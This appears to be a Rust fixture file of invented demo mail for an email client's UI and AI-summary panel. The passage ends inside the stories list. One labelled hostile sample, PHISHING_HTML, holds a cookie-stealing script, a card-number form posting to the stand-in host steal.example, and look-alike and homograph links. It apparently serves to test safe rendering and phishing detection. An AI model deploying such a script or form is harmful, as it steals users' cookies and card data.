//! The made-up mail. Every name, company and address here is invented; domains use the reserved
//! `.example` top-level domain so nothing can ever resolve.

use lumbridge_mail_core::Category;

/// Index into `ACCOUNTS`.
pub const PERSONAL: usize = 0;
pub const WORK: usize = 1;
pub const ANON: usize = 2;

pub struct DemoAccount {
    pub id: &'static str,
    pub label: &'static str,
    pub email: &'static str,
    pub name: &'static str,
    pub color: &'static str,
    /// Custom labels, shown under the account.
    pub labels: &'static [&'static str],
}

pub const ACCOUNTS: [DemoAccount; 3] = [
    DemoAccount { id: "personal", label: "Personal", email: "sam.rivera@inkwell.example", name: "Sam Rivera",
                  color: "#6ea0ff", labels: &["Travel", "Home"] },
    DemoAccount { id: "work", label: "Northwind", email: "sam@northwind-labs.example", name: "Sam Rivera",
                  color: "#f0b04a", labels: &["Atlas", "Hiring"] },
    DemoAccount { id: "anon", label: "Otter", email: "quiet.otter@relaymail.example", name: "Quiet Otter",
                  color: "#b89cff", labels: &["Forums"] },
];

#[derive(Clone, Copy)]
pub struct P(pub &'static str, pub &'static str);

/// "Me": the account's own address.
pub const ME: P = P("", "");

pub const MAYA: P = P("Maya Chen", "maya.chen@postbox.example");
pub const JONAH: P = P("Jonah Park", "jonah@parkfamily.example");
pub const ELENA: P = P("Elena Varga", "elena.varga@postbox.example");
pub const TOMAS: P = P("Tomás Reyes", "tomas.r@postbox.example");
pub const PRIYA: P = P("Priya Natarajan", "priya@harbourlets.example");
pub const DANA: P = P("Dana Okafor", "dana@northwind-labs.example");
pub const RAVI: P = P("Ravi Menon", "ravi@northwind-labs.example");
pub const LEO: P = P("Leo Martins", "leo@northwind-labs.example");
pub const AIKO: P = P("Aiko Tanaka", "aiko@northwind-labs.example");
pub const INES: P = P("Inês Duarte", "ines@harborline.example");
pub const KESTREL: P = P("kestrel_92", "kestrel92@relaymail.example");

/// An attachment: file name, MIME type, size, and the `Content-ID` when it is an inline image.
pub struct Att(pub &'static str, pub &'static str, pub u64, pub Option<&'static str>);

pub struct Msg {
    pub from: P,
    pub to: &'static [P],
    pub cc: &'static [P],
    pub mins_ago: i64,
    pub text: &'static str,
    pub html: Option<&'static str>,
    pub attachments: &'static [Att],
    /// Headers worth showing (List-Unsubscribe, Reply-To, Authentication-Results).
    pub headers: &'static [(&'static str, &'static str)],
}

pub struct Story {
    pub account: usize,
    pub subject: &'static str,
    pub labels: &'static [&'static str],
    pub category: Category,
    pub priority: u8,
    /// The list row's one line.
    pub summary: &'static str,
    /// The AI panel's longer summary.
    pub ai_summary: &'static str,
    pub actions: &'static [(&'static str, Option<i64>)],
    pub needs_reply: bool,
    /// Days from now.
    pub due_days: Option<i64>,
    pub flagged: bool,
    pub unread: u32,
    pub msgs: &'static [Msg],
}

const fn m(from: P, mins_ago: i64, text: &'static str) -> Msg {
    Msg { from, to: &[ME], cc: &[], mins_ago, text, html: None, attachments: &[], headers: &[] }
}

// A layout-table newsletter in the shape the big senders use (adapted from the render crate's
// `newsletter-layout.html` fixture): preheader, remote fonts and CSS, images, a button, two columns, a
// footer with social icons, tracking pixels.
const NEWSLETTER_HTML: &str = r##"<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>The Weekly Byte #212</title>
<link href="https://fonts.weeklybyte.example/css?family=Inter" rel="stylesheet">
<style>@import url("https://fonts.weeklybyte.example/inter.css"); body{margin:0;background:#f4f4f4} .hero{background-image:url(https://cdn.weeklybyte.example/bg.png)}</style>
</head>
<body style="margin:0;padding:0;background-color:#f4f4f4" bgcolor="#f4f4f4">
<div style="display:none;max-height:0px;overflow:hidden;mso-hide:all">Sync engines, a database in a URL, and the keyboard layout argument.&zwnj;&nbsp;&zwnj;&nbsp;</div>
<center><table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td align="center" style="padding:20px 0">
<table role="presentation" width="600" cellpadding="0" cellspacing="0" border="0" style="width:600px;background:#ffffff">
<tr><td align="right" style="padding:8px 24px;font-size:12px"><a href="https://click.weeklybyte.example/v?u=8812&amp;utm_source=newsletter">View in browser</a></td></tr>
<tr><td class="hero" style="padding:0"><a href="https://weeklybyte.example/212?utm_campaign=hero"><img src="https://cdn.weeklybyte.example/i/600x260/hero.png" width="600" height="260" alt="The Weekly Byte: issue 212" style="display:block;width:100%;height:auto"></a></td></tr>
<tr><td style="padding:28px 24px 8px 24px;font-size:28px;font-weight:bold;color:#111111">The quiet return of local-first software</td></tr>
<tr><td style="padding:0 24px 16px 24px;font-size:16px;line-height:24px;color:#333333">
<p style="margin:0 0 12px 0">This week: why sync engines are having a moment, a tiny database that fits in a URL, and the keyboard layout argument that will not die.</p>
<p style="margin:0">Readers get <strong>three months free</strong> of our deep-dive tier with code <code>BYTE212</code>.</p>
</td></tr>
<tr><td align="center" style="padding:8px 24px 28px 24px"><table role="presentation" cellpadding="0" cellspacing="0" border="0"><tr>
<td bgcolor="#2a78d6" style="border-radius:6px;padding:12px 28px"><a href="https://weeklybyte.example/212/read?utm_campaign=cta" style="color:#ffffff;font-weight:bold;text-decoration:none">Read the issue &rarr;</a></td>
</tr></table></td></tr>
<tr><td style="padding:0 24px"><table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"><tr>
<td width="50%" valign="top" style="padding:8px"><img src="https://cdn.weeklybyte.example/i/268x150/sync.png" width="268" height="150" alt="Chart: sync engines by year">
<p style="font-size:18px;font-weight:bold;margin:8px 0 4px 0">1. Local-first, again</p>
<p style="margin:0">Three new sync libraries shipped in a month. We read the docs so you don't have to. <a href="https://weeklybyte.example/212/sync">Read more</a></p></td>
<td width="50%" valign="top" style="padding:8px"><img src="https://cdn.weeklybyte.example/i/268x150/url-db.png" width="268" height="150" alt="A database in a URL">
<p style="font-size:18px;font-weight:bold;margin:8px 0 4px 0">2. A database in a URL</p>
<p style="margin:0">It is 40 KB, it is SQLite-shaped, and it lives after the #. <a href="https://weeklybyte.example/212/urldb">Read more</a></p></td>
</tr></table></td></tr>
<tr><td align="center" style="padding:16px 24px;border-top:1px solid #eeeeee">
<a href="https://weeklybyte.example/social/m"><img src="https://cdn.weeklybyte.example/i/24x24/m.png" width="24" height="24" alt="Mastodon"></a>
<a href="https://weeklybyte.example/social/rss"><img src="https://cdn.weeklybyte.example/i/24x24/rss.png" width="24" height="24" alt="RSS"></a>
</td></tr>
<tr><td align="center" style="padding:8px 24px 24px 24px;font-size:11px;color:#999999">The Weekly Byte, 1 Example Lane, Example City<br>
You get this because you subscribed at weeklybyte.example. <a href="https://weeklybyte.example/u/8812">Unsubscribe</a> &middot; <a href="https://weeklybyte.example/p/8812">Preferences</a></td></tr>
</table></td></tr></table></center>
<img src="https://t.weeklybyte.example/open.gif?u=8812" width="1" height="1" alt="" style="display:block;height:1px;width:1px;border:0">
<img src="https://pixel.adnet.example/p.gif?id=9" alt="">
</body></html>"##;

const NEWSLETTER_HEADERS: &[(&str, &str)] = &[
    ("List-Unsubscribe", "<mailto:leave@weeklybyte.example?subject=unsubscribe>, <https://weeklybyte.example/u/8812>"),
    ("List-Unsubscribe-Post", "List-Unsubscribe=One-Click"),
    ("List-Id", "The Weekly Byte <weekly.weeklybyte.example>"),
    ("Authentication-Results", "mx.inkwell.example; spf=pass smtp.mailfrom=bounce@weeklybyte.example; dkim=pass header.d=weeklybyte.example; dmarc=pass header.from=weeklybyte.example"),
];

// A receipt with a real data table (after the render crate's `data-table-receipt.html`).
const RECEIPT_HTML: &str = r##"<html><body>
<h1>Your order is on its way</h1>
<p>Order <b>#4471-2290</b>, placed on 8 November 2026. It should arrive on <b>Thursday</b>.</p>
<table border="0" cellpadding="6" style="border-collapse:collapse">
<thead><tr><th align="left">Item</th><th>Qty</th><th align="right">Price</th></tr></thead>
<tbody>
<tr><td>Arc desk lamp, oat</td><td>1</td><td align="right">49.00</td></tr>
<tr><td>Dot-grid notebook</td><td>2</td><td align="right">15.80</td></tr>
<tr><td>Shipping</td><td></td><td align="right">0.00</td></tr>
<tr><td colspan="2"><b>Total</b></td><td align="right"><b>64.80</b></td></tr>
</tbody></table>
<hr>
<p>Questions? Reply to this mail or see <a href="https://help.parcelly.example/orders">help.parcelly.example</a>.</p>
<pre>Tracking: PX 4471 2290 18
Carrier:  Example Post</pre>
</body></html>"##;

// An Outlook reply chain: Word's markup, a signature, and two older messages under the
// "From: / Sent:" dividers (after the render crate's `outlook-reply.html`).
const OUTLOOK_HTML: &str = r##"<html xmlns:o="urn:schemas-microsoft-com:office:office"><head>
<meta name="Generator" content="Microsoft Word 15 (filtered medium)">
<style><!-- p.MsoNormal {margin:0cm; font-size:11.0pt; font-family:"Calibri",sans-serif;} --></style></head>
<body lang="EN-US" link="#0563C1">
<div class="WordSection1">
<p class="MsoNormal">Hi Sam,<o:p></o:p></p>
<p class="MsoNormal"><o:p>&nbsp;</o:p></p>
<p class="MsoNormal">Numbers for Q3 below, as you asked. The board deck goes out <b>Friday at noon</b>.<o:p></o:p></p>
<table class="MsoTableGrid" border="1" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
<tr><td width="200"><p class="MsoNormal"><b>Region<o:p></o:p></b></p></td><td width="120"><p class="MsoNormal"><b>Revenue<o:p></o:p></b></p></td><td width="120"><p class="MsoNormal"><b>vs Q2<o:p></o:p></b></p></td></tr>
<tr><td><p class="MsoNormal">North<o:p></o:p></p></td><td><p class="MsoNormal">1.2M<o:p></o:p></p></td><td><p class="MsoNormal">+8%<o:p></o:p></p></td></tr>
<tr><td><p class="MsoNormal">South<o:p></o:p></p></td><td><p class="MsoNormal">0.9M<o:p></o:p></p></td><td><p class="MsoNormal">+3%<o:p></o:p></p></td></tr>
</table>
<p class="MsoNormal"><o:p>&nbsp;</o:p></p>
<p class="MsoNormal">Best regards,<o:p></o:p></p>
<div id="Signature"><p class="MsoNormal"><span style="font-size:10.0pt;color:#1F3864">Ines Duarte | Finance Lead<br>Harborline<o:p></o:p></span></p></div>
<p class="MsoNormal"><o:p>&nbsp;</o:p></p>
<div style="border:none;border-top:solid #E1E1E1 1.0pt;padding:3.0pt 0cm 0cm 0cm">
<p class="MsoNormal"><b>From:</b> Sam Rivera &lt;sam@northwind-labs.example&gt; <br><b>Sent:</b> Monday, November 9, 2026 10:02 AM<br><b>To:</b> Ines Duarte &lt;ines@harborline.example&gt;<br><b>Subject:</b> Q3 numbers for the board deck?<o:p></o:p></p>
</div>
<p class="MsoNormal"><o:p>&nbsp;</o:p></p>
<p class="MsoNormal">Hi Ines, could you send the Q3 regional numbers before Friday? Ravi wants them in the board deck.<o:p></o:p></p>
<p class="MsoNormal">Thanks, Sam<o:p></o:p></p>
<p class="MsoNormal"><o:p>&nbsp;</o:p></p>
<div style="border:none;border-top:solid #E1E1E1 1.0pt;padding:3.0pt 0cm 0cm 0cm">
<p class="MsoNormal"><b>From:</b> Ravi Menon &lt;ravi@northwind-labs.example&gt; <br><b>Sent:</b> Friday, November 6, 2026 4:40 PM<br><b>To:</b> Sam Rivera &lt;sam@northwind-labs.example&gt;<br><b>Subject:</b> Board deck<o:p></o:p></p>
</div>
<p class="MsoNormal">Sam, can you get Harborline's Q3 numbers for slide 7?<o:p></o:p></p>
</div>
</body></html>"##;

// A hostile message: a fake card-security notice with lying links, a homograph, an IP address, a
// script, a form, and Reply-To and authentication that give it away (after `hostile-phishing.html`).
const PHISHING_HTML: &str = r##"<html><head><script>document.location='https://steal.example/'+document.cookie</script>
<meta http-equiv="refresh" content="0;url=https://steal.example/"></head>
<body onload="alert(1)">
<h2>Your Cobalt Card account is on hold</h2>
<p>We noticed unusual activity. Sign in within 24 hours to restore access:</p>
<p><a href="https://login.c0balt-secure.example/verify">https://www.cobaltcard.example/login</a></p>
<p>Or use the secure portal: <a href="http://203.0.113.44/login">Secure portal</a></p>
<p>Mobile users: <a href="https://xn--cbaltcard-02h.example/m">cobaltcard.example/m</a></p>
<form action="https://steal.example/collect"><input name="card" placeholder="Card number"><button>Verify</button></form>
<p>Need help? Visit <a href="https://help.cobaltcard.example/faq">help.cobaltcard.example</a>.</p>
<p>Regards,<br>Cobalt Card Security Team</p>
<img src="https://steal.example/o.gif?id=77" width="1" height="1">
</body></html>"##;

const PHISHING_HEADERS: &[(&str, &str)] = &[
    ("Reply-To", "Cobalt Card Security <verify@c0balt-secure.example>"),
    ("Authentication-Results", "mx.inkwell.example; spf=fail smtp.mailfrom=cobaltcard-alerts.example; dkim=none; dmarc=fail header.from=cobaltcard-alerts.example"),
];

// An inline (cid:) image from the message's own parts: no network needed, shown at once.
const FLOORPLAN_HTML: &str = r##"<html><body>
<p>Hi Sam,</p>
<p>Here is the floor plan for the flat on Quay Street, as promised:</p>
<p><img src="cid:floorplan@harbourlets.example" alt="Floor plan" width="560" height="320"></p>
<p>The second bedroom is the one by the stairs. Viewings are <b>Saturday 10:00 to 12:00</b>; let me know which slot suits.</p>
<p>Kind regards,<br>Priya Natarajan<br>Harbour Lets</p>
</body></html>"##;

const PROMO_HTML: &str = r##"<html><body><img src="https://img.northpeak.example/hero-winter.jpg" alt="Winter collection">
<h1>48 hours only: 30% off winter layers</h1><p>Use code FROST30 at checkout. Ends Thursday at midnight.</p>
<img src="https://img.northpeak.example/jackets.jpg" alt="Jackets"><img src="https://px.northpeak.example/o.gif" width="1" height="1">
</body></html>"##;

pub const STORIES: &[Story] = &[
    Story {
        account: WORK, subject: "Atlas launch: go/no-go on Thursday", labels: &["Atlas"],
        category: Category::Important, priority: 92, needs_reply: true, due_days: Some(2), flagged: true, unread: 2,
        summary: "Dana needs your go/no-go on the Atlas launch by Thursday; two blockers left.",
        ai_summary: "Dana is collecting go/no-go calls for the Atlas launch on Thursday at 10:00. Two blockers remain: \
the webhook retry fix (Aiko says it lands Wednesday) and the pricing page copy (Ravi is waiting on legal). \
Leo is fine to launch if support has the runbook. Dana asked you specifically to confirm the rollback plan \
and to say whether you are a go.",
        actions: &[("Confirm the rollback plan with Dana", Some(1)), ("Give your go/no-go", Some(2)),
                   ("Read the launch checklist (PDF)", None)],
        msgs: &[
            Msg { headers: &[], from: DANA, to: &[ME, RAVI, LEO, AIKO], cc: &[], mins_ago: 2890, html: None,
                  attachments: &[Att("atlas-launch-checklist.pdf", "application/pdf", 248_000, None)],
                  text: "Hi all,\n\nWe're on track for Thursday 10:00. I'd like a go/no-go from each of you by Wednesday evening.\n\nOpen items:\n- Webhook retries (Aiko)\n- Pricing page copy (Ravi)\n- Support runbook (Leo)\n\nChecklist attached.\n\nDana" },
            Msg { headers: &[], from: AIKO, to: &[DANA], cc: &[ME, RAVI, LEO], mins_ago: 2700, html: None, attachments: &[],
                  text: "The retry fix is in review. It should land Wednesday morning.\n\nOn Mon, Dana Okafor wrote:\n> We're on track for Thursday 10:00. I'd like a go/no-go from each of you by Wednesday evening.\n> Open items:\n> - Webhook retries (Aiko)" },
            Msg { headers: &[], from: RAVI, to: &[DANA], cc: &[ME, LEO, AIKO], mins_ago: 1500, html: None, attachments: &[],
                  text: "Pricing copy is with legal. They promised comments tomorrow. If they slip I'd ship with the current page and update later.\n\nOn Mon, Dana Okafor wrote:\n> Pricing page copy (Ravi)" },
            Msg { headers: &[], from: LEO, to: &[DANA], cc: &[ME, RAVI, AIKO], mins_ago: 600, html: None, attachments: &[],
                  text: "Go from support, as long as the runbook is in the wiki by Wednesday. I'll do a dry run with the team.\n\nLeo" },
            Msg { headers: &[], from: DANA, to: &[ME], cc: &[], mins_ago: 38, html: None, attachments: &[],
                  text: "Sam, can you confirm the rollback plan? It's the one piece I don't have in writing. Then I just need your go/no-go.\n\nThanks,\nDana\n\nOn Tue, Leo Martins wrote:\n> Go from support, as long as the runbook is in the wiki by Wednesday.\n> I'll do a dry run with the team." },
        ],
    },
    Story {
        account: PERSONAL, subject: "Dinner Saturday?", labels: &[],
        category: Category::Personal, priority: 78, needs_reply: true, due_days: Some(4), flagged: false, unread: 1,
        summary: "Maya asks if Saturday 7:30 at Olive & Thyme works, or Sunday brunch instead.",
        ai_summary: "Maya and Tomás want dinner this Saturday. Maya booked a table for four at Olive & Thyme at 7:30 \
but can move it to Sunday brunch. She needs an answer by Thursday to keep the booking.",
        actions: &[("Tell Maya: Saturday or Sunday", Some(3))],
        msgs: &[
            m(MAYA, 1450, "Hey! Tomás and I are free Saturday. Dinner? There's that new place on Harbour Street everyone keeps talking about."),
            m(ME, 1380, "Yes please. Saturday works for me, maybe 7ish?\n\nOn Mon, Maya Chen wrote:\n> Hey! Tomás and I are free Saturday. Dinner?"),
            m(TOMAS, 300, "I'm in. Can we make it 7:30, I'm coming from the climbing gym."),
            m(MAYA, 12, "Booked Olive & Thyme for four at 7:30 on Saturday. If that's bad for you I can switch it to Sunday brunch, they had space at 11. Let me know by Thursday so I don't lose the table!\n\nOn Tue, Tomás Reyes wrote:\n> I'm in. Can we make it 7:30, I'm coming from the climbing gym."),
        ],
    },
    Story {
        account: PERSONAL, subject: "Your sign-in code", labels: &[],
        category: Category::Sensitive, priority: 60, needs_reply: false, due_days: None, flagged: false, unread: 1,
        summary: "A security code from Brightdesk", ai_summary: "", actions: &[],
        msgs: &[m(P("Brightdesk", "no-reply@brightdesk.example"), 4, "Your code is 482 913. It expires in 10 minutes. If you didn't ask for it, you can ignore this email.")],
    },
    Story {
        account: WORK, subject: "[atlas] CI failed on main (#1842)", labels: &["Atlas"],
        category: Category::Notification, priority: 40, needs_reply: false, due_days: None, flagged: false, unread: 1,
        summary: "Build #1842 failed: 3 webhook tests timed out after Aiko's retry change.",
        ai_summary: "The main branch build #1842 failed. Three tests in webhooks/retry_test timed out; the last \
green build was #1839. The failing commit is Aiko's 'retry with backoff'.",
        actions: &[("Look at webhooks/retry_test", None)],
        msgs: &[m(P("Northwind CI", "ci@builds.northwind-labs.example"), 55,
                  "Build #1842 on main failed after 6m 12s.\n\nFailed: webhooks/retry_test::backs_off_on_429 (timeout)\nFailed: webhooks/retry_test::gives_up_after_five (timeout)\nFailed: webhooks/retry_test::keeps_order (timeout)\n\nLast green: #1839.")],
    },
    Story {
        account: PERSONAL, subject: "The Weekly Byte #212: the quiet return of local-first", labels: &[],
        category: Category::Newsletter, priority: 20, needs_reply: false, due_days: None, flagged: false, unread: 1,
        summary: "Local-first sync libraries, a database in a URL, keyboard layouts.",
        ai_summary: "This issue covers three new local-first sync libraries, a tiny database that fits in a URL, and \
a long piece on keyboard layouts. Nothing asks anything of you.",
        actions: &[],
        msgs: &[Msg { headers: NEWSLETTER_HEADERS, from: P("The Weekly Byte", "hello@weeklybyte.example"), to: &[ME], cc: &[], mins_ago: 95,
                      attachments: &[], html: Some(NEWSLETTER_HTML),
                      text: "Issue 212: the quiet return of local-first software\n\nThis week: why sync engines are having a moment, a tiny database that fits in a URL, and the keyboard layout argument that will not die.\n\n1. Local-first, again\n\nThree new sync libraries shipped in a month. We read the docs so you don't have to." }],
    },
    Story {
        account: ANON, subject: "Re: Your listing: vintage synth (Juno-style, 1980s)", labels: &["Forums"],
        category: Category::Personal, priority: 55, needs_reply: true, due_days: None, flagged: false, unread: 1,
        summary: "kestrel_92 offers 420 for the synth and asks about local pickup.",
        ai_summary: "A buyer, kestrel_92, offers 420 for the synth (you listed it at 480) and asks whether they can \
pick it up this weekend. They also want to know if the power supply is included.",
        actions: &[("Answer the offer (420 vs 480)", None), ("Say whether the power supply is included", None)],
        msgs: &[
            m(KESTREL, 2200, "Hi, is the synth still available? Does it have any dead keys?"),
            m(ME, 2100, "Still available. All keys work, one slider is a bit stiff.\n\nOn Sun, kestrel_92 wrote:\n> Hi, is the synth still available? Does it have any dead keys?"),
            m(KESTREL, 140, "Great. Would you take 420? I could pick it up this weekend. Is the power supply included?"),
        ],
    },
    Story {
        account: PERSONAL, subject: "Your order #4471-2290 has shipped", labels: &[],
        category: Category::Transactional, priority: 30, needs_reply: false, due_days: Some(2), flagged: false, unread: 0,
        summary: "Parcelly order shipped; arrives Thursday. Invoice attached.",
        ai_summary: "Your Parcelly order (a desk lamp and two notebooks, 64.80 total) shipped and should arrive on \
Thursday. The invoice is attached.",
        actions: &[("Expect a delivery on Thursday", Some(2))],
        msgs: &[Msg { headers: &[], from: P("Parcelly", "orders@parcelly.example"), to: &[ME], cc: &[], mins_ago: 210, html: Some(RECEIPT_HTML),
                      attachments: &[Att("invoice-4471-2290.pdf", "application/pdf", 41_200, None)],
                      text: "Good news: your order is on its way.\n\nOrder #4471-2290\n- Arc desk lamp, oat: 49.00\n- Dot-grid notebook (2): 15.80\nTotal: 64.80\n\nEstimated delivery: Thursday.\n\nTrack your parcel in the Parcelly app." }],
    },
    Story {
        account: WORK, subject: "Offer letter draft for review", labels: &["Hiring"],
        category: Category::Important, priority: 85, needs_reply: true, due_days: Some(1), flagged: true, unread: 0,
        summary: "Leo wants your edits on the offer letter for the backend role by tomorrow.",
        ai_summary: "Leo drafted the offer letter for the senior backend candidate and wants your review of the \
start date and the equity paragraph by tomorrow noon, so it can go out before the weekend.",
        actions: &[("Review start date and equity paragraph", Some(1))],
        msgs: &[Msg { headers: &[], from: LEO, to: &[ME], cc: &[], mins_ago: 260, html: None,
                      attachments: &[Att("offer-letter-draft-v2.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document", 88_400, None)],
                      text: "Hi Sam,\n\nDraft attached. Could you check the start date (I put 6 January) and the equity paragraph? I'd like to send it before the weekend, so tomorrow noon would be ideal.\n\nThanks,\nLeo" }],
    },
    Story {
        account: PERSONAL, subject: "Photos from the ridge hike", labels: &[],
        category: Category::Personal, priority: 50, needs_reply: false, due_days: None, flagged: true, unread: 0,
        summary: "Jonah sent four photos from Sunday's hike.",
        ai_summary: "Jonah shared four photos from Sunday's ridge hike, including the one at the summit cairn. He \
suggests doing the coastal trail next month.",
        actions: &[],
        msgs: &[Msg { headers: &[], from: JONAH, to: &[ME], cc: &[], mins_ago: 380, html: None,
                      attachments: &[Att("summit.jpg", "image/jpeg", 2_400_000, None), Att("ridge-path.jpg", "image/jpeg", 3_100_000, None),
                                     Att("lunch-stop.jpg", "image/jpeg", 1_900_000, None), Att("descent.jpg", "image/jpeg", 2_700_000, None)],
                      text: "Finally got these off my camera. The summit one came out great.\n\nCoastal trail next month?\n\nJ" }],
    },
    Story {
        account: WORK, subject: "Re: API rate limits for Harborline's integration", labels: &[],
        category: Category::Important, priority: 80, needs_reply: true, due_days: Some(3), flagged: false, unread: 1,
        summary: "Harborline hits 429s at peak; Inês asks for a temporary limit raise.",
        ai_summary: "Inês at Harborline says their integration hits 429 errors between 08:00 and 09:00 UTC. She \
asks for a temporary raise from 600 to 1,500 requests a minute until their batching change ships in three weeks.",
        actions: &[("Decide on the temporary rate limit", Some(3)), ("Reply to Inês", Some(3))],
        msgs: &[
            m(INES, 4300, "Hello Sam,\n\nOur integration keeps hitting 429s during the morning peak. Is there anything we can do?\n\nInês"),
            m(ME, 4100, "Hi Inês, thanks for flagging. What request rate are you seeing at peak?\n\nOn Fri, Inês Duarte wrote:\n> Our integration keeps hitting 429s during the morning peak."),
            m(INES, 75, "Around 1,200 a minute between 08:00 and 09:00 UTC. Could you raise us to 1,500 for three weeks? Our batching change ships after that and we'll drop well under 600.\n\nOn Mon, Sam Rivera wrote:\n> What request rate are you seeing at peak?"),
        ],
    },
    Story {
        account: PERSONAL, subject: "Book club: December pick", labels: &[],
        category: Category::Personal, priority: 45, needs_reply: false, due_days: Some(9), flagged: false, unread: 3,
        summary: "The club picked 'The Glass Orchard'; meeting moved to the 19th at Elena's.",
        ai_summary: "After a long back-and-forth the book club chose 'The Glass Orchard' for December. The meeting \
moved to the 19th at Elena's flat; Tomás brings dessert and asks who can bring chairs.",
        actions: &[("Offer to bring chairs?", None), ("Meeting on the 19th at Elena's", Some(9))],
        msgs: &[
            m(ELENA, 7200, "December pick time! Nominations: 'The Glass Orchard', 'Salt Roads', or something short for the holidays?"),
            m(MAYA, 7000, "Glass Orchard! I've heard it's gorgeous.\n\nOn Mon, Elena Varga wrote:\n> Nominations: 'The Glass Orchard', 'Salt Roads', or something short"),
            m(TOMAS, 6500, "Salt Roads for me, but I'll go with the group."),
            m(ME, 6400, "Glass Orchard gets my vote too."),
            m(ELENA, 3000, "Glass Orchard it is. Also: can we move to the 19th? The 12th is bad for two people."),
            m(MAYA, 2000, "19th works.\n\nOn Wed, Elena Varga wrote:\n> Glass Orchard it is. Also: can we move to the 19th?"),
            m(TOMAS, 800, "19th is fine. I'll bring dessert. Who can bring a couple of chairs?\n\nOn Wed, Elena Varga wrote:\n> Glass Orchard it is.\n> Also: can we move to the 19th? The 12th is bad for two people."),
        ],
    },
    Story {
        account: WORK, subject: "Q4 planning doc: comments by Friday", labels: &[],
        category: Category::Important, priority: 70, needs_reply: true, due_days: Some(3), flagged: false, unread: 0,
        summary: "Ravi wants comments on the Q4 plan, especially the hiring section, by Friday.",
        ai_summary: "Ravi shared the Q4 planning document and asks everyone to comment by Friday. He wants your view \
on the hiring section in particular: two backend roles versus one backend and one SRE.",
        actions: &[("Comment on the hiring section", Some(3))],
        msgs: &[m(RAVI, 1700, "Team, the Q4 plan is in the shared drive. Comments by Friday please. Sam, I'd love your take on the hiring section: two backend roles, or one backend and one SRE?\n\nRavi")],
    },
    Story {
        account: PERSONAL, subject: "Boiler service on Thursday, 9 to 12", labels: &["Home"],
        category: Category::Important, priority: 75, needs_reply: true, due_days: Some(2), flagged: false, unread: 1,
        summary: "Priya (letting agent) needs someone home Thursday 9 to 12 for the boiler service.",
        ai_summary: "Your letting agent says the annual boiler service is booked for Thursday between 9 and 12. She \
needs to know if someone will be home, or whether the engineer can use the key safe.",
        actions: &[("Tell Priya: home, or key safe", Some(2))],
        msgs: &[m(PRIYA, 170, "Hi Sam,\n\nThe annual boiler service is booked for Thursday, between 9 and 12. Will someone be home? If not, may the engineer use the key safe?\n\nKind regards,\nPriya Natarajan\nHarbour Lets")],
    },
    Story {
        account: WORK, subject: "[atlas] PR #311: Retry webhooks with backoff", labels: &["Atlas"],
        category: Category::Notification, priority: 35, needs_reply: false, due_days: None, flagged: false, unread: 1,
        summary: "Aiko requested your review on the webhook retry PR.",
        ai_summary: "Aiko opened PR #311, which retries failed webhooks with exponential backoff and caps at five \
attempts. She requested your review.",
        actions: &[("Review PR #311", None)],
        msgs: &[m(P("Codehub", "notifications@codehub.example"), 330, "@aiko requested your review on northwind/atlas#311.\n\nRetry webhooks with backoff\n\n+214 -38 across 6 files.")],
    },
    Story {
        account: PERSONAL, subject: "Your account statement is ready", labels: &[],
        category: Category::Sensitive, priority: 40, needs_reply: false, due_days: None, flagged: false, unread: 0,
        summary: "Bank or money mail from Cobalt Card", ai_summary: "", actions: &[],
        msgs: &[m(P("Cobalt Card", "statements@cobaltcard.example"), 520, "Your November statement is ready to view in online banking.")],
    },
    Story {
        account: PERSONAL, subject: "48 hours only: 30% off winter layers", labels: &[],
        category: Category::Promotion, priority: 10, needs_reply: false, due_days: Some(2), flagged: false, unread: 1,
        summary: "Northpeak: 30% off winter gear with FROST30 until Thursday.",
        ai_summary: "A Northpeak Outfitters sale: 30% off winter layers with code FROST30, ending Thursday at midnight.",
        actions: &[],
        msgs: &[Msg { headers: &[], from: P("Northpeak Outfitters", "deals@northpeak.example"), to: &[ME], cc: &[], mins_ago: 610,
                      attachments: &[], html: Some(PROMO_HTML),
                      text: "48 hours only: 30% off winter layers. Use code FROST30 at checkout. Ends Thursday at midnight." }],
    },
    Story {
        account: ANON, subject: "Digest: 14 new posts in Mechanical Keyboards", labels: &["Forums"],
        category: Category::Newsletter, priority: 15, needs_reply: false, due_days: None, flagged: false, unread: 1,
        summary: "Forum digest: a group buy for walnut cases, a lubing guide, 12 more.",
        ai_summary: "The forum digest has 14 new posts. The most active are a group buy for walnut cases and a guide \
to lubing linear switches.",
        actions: &[],
        msgs: &[m(P("Tinkerers Forum", "digest@tinkerers.example"), 720, "14 new posts in Mechanical Keyboards\n\n- Group buy: walnut 65% cases (42 replies)\n- Guide: lubing linear switches without tears (18 replies)\n- 12 more")],
    },
    Story {
        account: WORK, subject: "Your invoice from Cloudlet (November)", labels: &[],
        category: Category::Transactional, priority: 30, needs_reply: false, due_days: Some(14), flagged: false, unread: 0,
        summary: "Cloudlet invoice: 1,284.50 for November, paid by card on the 1st.",
        ai_summary: "Cloudlet billed 1,284.50 for November hosting; it will be charged to the company card on the 1st.",
        actions: &[("Forward to finance", None)],
        msgs: &[Msg { headers: &[], from: P("Cloudlet Billing", "billing@cloudlet.example"), to: &[ME], cc: &[], mins_ago: 900, html: None,
                      attachments: &[Att("cloudlet-invoice-2026-11.pdf", "application/pdf", 64_000, None)],
                      text: "Invoice for November: 1,284.50\n\nCompute: 912.00\nStorage: 241.30\nTransfer: 131.20\n\nThis will be charged to the card on file on the 1st." }],
    },
    Story {
        account: PERSONAL, subject: "Flight itinerary: SFO to LIS, 14 December", labels: &["Travel"],
        category: Category::Transactional, priority: 55, needs_reply: false, due_days: Some(33), flagged: true, unread: 0,
        summary: "Skyway SK 214, 14 Dec 18:40 from SFO; check-in opens 24h before.",
        ai_summary: "Your Skyway flight SK 214 leaves SFO on 14 December at 18:40 and lands in Lisbon at 14:05 the \
next day. Seat 23A. Online check-in opens 24 hours before departure.",
        actions: &[("Check in online on 13 December", Some(32))],
        msgs: &[Msg { headers: &[], from: P("Skyway", "itinerary@skyway.example"), to: &[ME], cc: &[], mins_ago: 1300, html: None,
                      attachments: &[Att("itinerary-SK214.pdf", "application/pdf", 120_000, None)],
                      text: "Booking reference QX7L2P\n\nSK 214  San Francisco (SFO) 14 Dec 18:40  to  Lisbon (LIS) 15 Dec 14:05\nSeat 23A, one checked bag.\n\nOnline check-in opens 24 hours before departure." }],
    },
